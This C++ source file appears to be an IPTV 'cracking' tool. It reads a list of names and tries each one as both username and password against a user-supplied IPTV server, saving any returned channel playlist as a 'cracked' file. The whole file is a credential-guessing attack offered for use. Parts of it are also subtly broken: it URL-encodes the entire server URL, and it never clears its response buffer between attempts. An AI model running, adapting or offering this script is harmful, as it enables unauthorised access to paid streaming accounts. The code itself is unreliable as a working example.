#include <iostream>
#include <cctype>
#include <iomanip>
#include <sstream>
#include <string>
#include <curl/curl.h>
#include <fstream>

using namespace std;

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

string url_encode(const string &value) {
    ostringstream escaped;
    escaped.fill('0');
    escaped << hex;
    
    for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
        
        string::value_type c = (*i);
        
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
            continue;
        }
        escaped << uppercase;
        escaped << '%' << setw(2) << int((unsigned char) c);
        escaped << nouppercase;
    }
    
    return escaped.str();
}

void attack(string server) {
    CURL *curl;
    CURLcode res;
    string readBuffer;
    string line;
    string filename;
    string url;
    ifstream infile("names.txt");
    
    while(getline(infile, line)) {
        curl = curl_easy_init();
        if(curl) {
            url = string(server)+line+"&password="+line+"&type=m3u&output=mpegts";
            url = url_encode(url);
            filename = string("output/tv_channels_")+line+".m3u";
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
            res = curl_easy_perform(curl);
            curl_easy_cleanup(curl);
            
            if(readBuffer.size()>0) {
                ofstream out(filename);
                out << readBuffer;
                out.close();
            }
            
        }
    }
}

int main() {
    string server;
    
    cout << "-- iptv extreme --" << endl;
    cout << "coded by: @Arm4x" << endl;
    cout << "server url: ";
    cin >> server;
    cout << endl;
    cout << "[i] no output is showed for faster cracking, just wait until exit" << endl;
    cout << "[i] you will see cracked channel in the output directory" << endl;
    cout << "attacking..." << endl;
    attack(server);
    return 0;
}